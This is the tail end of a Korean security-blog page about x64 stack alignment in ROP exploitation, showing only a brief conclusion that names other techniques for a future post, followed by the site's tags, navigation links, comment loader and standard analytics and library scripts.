<h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>RET sled &#xB9D0;&#xACE0;&#xB3C4; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xBA74;&#xC11C; ROP &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xD55C; &#xAC00;&#xC9C0; &#xBC29;&#xBC95; &#xB354; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; &#xADF8;&#xAC74; endbr64&#xB791; CET&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD574;&#xC57C; &#xB3FC;&#xC11C; &#xAE30;&#xD68C;&#xAC00; &#xB418;&#xBA74; &#xB530;&#xB85C; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png" srcset="/img/loading.gif" alt></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                  
                  <a class="hover-with-bg" href="/tags/pwnable/">pwnable</a>
                  
                  <a class="hover-with-bg" href="/tags/bof/">bof</a>
                  
                  <a class="hover-with-bg" href="/tags/stack-alignment/">stack alignment</a>
                  
                  <a class="hover-with-bg" href="/tags/rtl/">rtl</a>
                  
                  <a class="hover-with-bg" href="/tags/rop/">rop</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_Fabu1ous.jpg" srcset="/img/loading.gif" alt="Fabu1ous">
                  </div>

                  <div class="link-text">
                    <div class="link-title">Fabu1ous</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/Fabu1ous">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2020/12/07/idioth/2020-12-07/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[] CVE-2020-17521: Apache Groovy Information Disclosure</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2020/12/05/fabu1ous/2020-12-05/">
                    <span class="hidden-mobile">[] CVE-2020-15680 : protocol handler infomation disclosure</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/';
        this.page.identifier = '/2020/12/06/fabu1ous/x64-stack-alignment/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] x64 stack alignment&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
